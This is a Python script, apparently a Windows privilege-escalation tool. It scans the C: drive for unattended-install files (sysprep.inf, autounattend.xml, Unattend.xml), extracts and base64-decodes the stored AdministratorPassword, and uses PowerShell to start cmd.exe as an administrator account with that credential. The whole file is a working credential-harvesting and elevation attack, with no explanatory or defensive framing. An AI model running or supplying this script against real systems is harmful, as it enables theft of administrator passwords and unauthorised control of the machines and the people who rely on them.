#!/usr/bin/python3

import os
import re
import base64
import subprocess as sp

def extract_password(file_path):
    """
    Opens the target file and extracts the AdministratorPassword value.
    """
    pattern = r'<AdministratorPassword>\s*<Value>(.*?)</Value>'
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            match = re.search(pattern, content, re.DOTALL)
            if match:
                return match.group(1).strip()
    except Exception as e:
        print(f" [!] Could not read {file_path}: {e}")
    return None

def find_files(targets, base_dir="C:\\"):
    targets_found = list()
    print(f'[*] Scanning {base_dir} for unattended configuration files...\n')
    
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            if file.lower() in [t.lower() for t in targets]:
                path = os.path.join(root, file)
                print(f'[+] Found configuration file: {path}')
                targets_found.append(file)
                
                extracted_val = extract_password(path)
                if extracted_val:
                    # Normalize Base64 padding if necessary
                    clean_val = extracted_val.strip()
                    missing_padding = len(clean_val) % 4
                    if missing_padding:
                        clean_val += '=' * (4 - missing_padding)
                    
                    try:
                        ascii_string = base64.b64decode(clean_val).decode('utf-8')
                        print(f'[+] Successfully decoded password: {ascii_string}')
                    except Exception:
                        ascii_string = clean_val
                        print(f'[*] Password appears to be plain text: {ascii_string}')
                    
                    # Target Account Session Configuration
                    admin_user = "SuperAdministrator"
                    admin_pass = ascii_string
                    
                    # Using standard system cmd.exe to ensure the file is always found
                    program = "C:\\Windows\\System32\\cmd.exe"
                    powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

                    # PowerShell script block to handle credential object generation and process spawning
                    ps_script = f"""
                    $secPass = ConvertTo-SecureString '{admin_pass}' -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential('{admin_user}', $secPass)
                    Start-Process '{program}' -Credential $cred
                    """

                    try:
                        print(f"[*] Attempting to elevate session via {admin_user}...")
                        sp.run([powershell_path, "-Command", ps_script], check=True)
                        print("[+] Administrative process spawned successfully.")
                    except Exception as e:
                        print(f"[!] Execution failed: {e}")
                else:
                    print(f'[-] No credentials found inside {file}.')

    print("\n[!] Scan complete.")

if __name__ == '__main__':
    # Common target layout
    target_files = ["sysprep.inf", "autounattend.xml", "Unattend.xml"]
    
    # Starting root directory
    find_files(targets=target_files, base_dir="C:\\")
    
    input("\nPress Enter to exit...")
